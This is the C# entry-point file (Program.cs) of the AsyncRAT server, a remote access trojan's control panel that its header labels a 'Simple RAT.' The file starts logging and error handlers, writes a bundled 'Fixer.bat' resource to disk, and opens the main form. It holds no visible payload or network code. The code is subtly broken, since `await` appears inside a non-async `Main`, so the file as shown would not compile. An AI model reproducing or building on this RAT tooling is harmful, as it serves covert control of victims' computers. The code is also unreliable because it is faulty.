using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Forms;
using Server.Helper;

/* 
       │ Author       : NYAN CAT
       │ Name         : AsyncRAT  Simple RAT
       │ Contact Me   : https:github.com/NYAN-x-CAT

       This program Is distributed for educational purposes only.
*/

namespace Server
{
    static class Program
    {
        public static Form1 form1;

        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            // Set up global exception handlers
            Application.SetUnhandledExceptionMode(UnhandledExceptionMode.CatchException);
            Application.ThreadException += Application_ThreadException;
            AppDomain.CurrentDomain.UnhandledException += CurrentDomain_UnhandledException;

            try
            {
                Logger.Info("AsyncRAT Server starting up...");

                // Initialize application
                Application.EnableVisualStyles();
                Application.SetCompatibleTextRenderingDefault(false);

                // Initialize resources
                await InitializeResourcesAsync();

                // Start log cleanup task
                _ = Task.Run(async () => await Logger.CleanupOldLogsAsync());

                // Create and run main form
                form1 = new Form1();
                Logger.Info("Main form created successfully");

                Application.Run(form1);
            }
            catch (Exception ex)
            {
                Logger.Critical("Fatal error during application startup", ex);
                ShowCriticalError("A critical error occurred during startup", ex);
                Environment.Exit(1);
            }
            finally
            {
                Logger.Info("AsyncRAT Server shutting down...");
                CleanupResources();
            }
        }

        private static async Task InitializeResourcesAsync()
        {
            try
            {
                string batPath = Path.Combine(Application.StartupPath, "Fixer.bat");
                if (!File.Exists(batPath))
                {
                    await Task.Run(() => File.WriteAllText(batPath, Properties.Resources.Fixer));
                    Logger.Info("Fixer.bat created successfully");
                }
                else
                {
                    Logger.Debug("Fixer.bat already exists");
                }
            }
            catch (UnauthorizedAccessException ex)
            {
                Logger.Error("Access denied when creating Fixer.bat - application may need administrator privileges", ex);
                MessageBox.Show(
                    "Access denied when creating required files. Please run as administrator or check file permissions.",
                    "Permission Error",
                    MessageBoxButtons.OK,
                    MessageBoxIcon.Warning);
            }
            catch (IOException ex)
            {
                Logger.Error("I/O error when creating Fixer.bat", ex);
                MessageBox.Show(
                    "File system error when creating required files. Please check disk space and permissions.",
                    "File System Error",
                    MessageBoxButtons.OK,
                    MessageBoxIcon.Warning);
            }
            catch (Exception ex)
            {
                Logger.Error("Unexpected error during resource initialization", ex);
                // Don't show message box for unexpected errors during initialization
                // as it might interfere with startup
            }
        }

        private static void CleanupResources()
        {
            try
            {
                form1?.Dispose();
                Logger.Info("Application resources cleaned up");
            }
            catch (Exception ex)
            {
                Logger.Error("Error during resource cleanup", ex);
            }
        }

        private static void Application_ThreadException(object sender, System.Threading.ThreadExceptionEventArgs e)
        {
            Logger.Error("Unhandled thread exception", e.Exception);
            
            var result = MessageBox.Show(
                $"An unexpected error occurred:\n\n{e.Exception.Message}\n\nWould you like to continue running the application?",
                "Application Error",
                MessageBoxButtons.YesNo,
                MessageBoxIcon.Error);

            if (result == DialogResult.No)
            {
                Logger.Info("User chose to exit application after thread exception");
                Application.Exit();
            }
        }

        private static void CurrentDomain_UnhandledException(object sender, UnhandledExceptionEventArgs e)
        {
            var exception = e.ExceptionObject as Exception;
            Logger.Critical("Unhandled domain exception", exception);

            if (e.IsTerminating)
            {
                ShowCriticalError("A fatal error occurred and the application must close", exception);
                Environment.Exit(1);
            }
        }

        private static void ShowCriticalError(string message, Exception exception)
        {
            try
            {
                var errorMessage = $"{message}\n\nError Details:\n{exception?.Message ?? "Unknown error"}";
                
                if (exception != null)
                {
                    errorMessage += $"\n\nFor technical support, please check the log files in the Logs directory.";
                }

                MessageBox.Show(
                    errorMessage,
                    "Critical Error",
                    MessageBoxButtons.OK,
                    MessageBoxIcon.Error);
            }
            catch
            {
                // If we can't even show a message box, write to console as last resort
                Console.WriteLine($"CRITICAL ERROR: {message}");
                if (exception != null)
                    Console.WriteLine($"Exception: {exception}");
            }
        }
    }
}
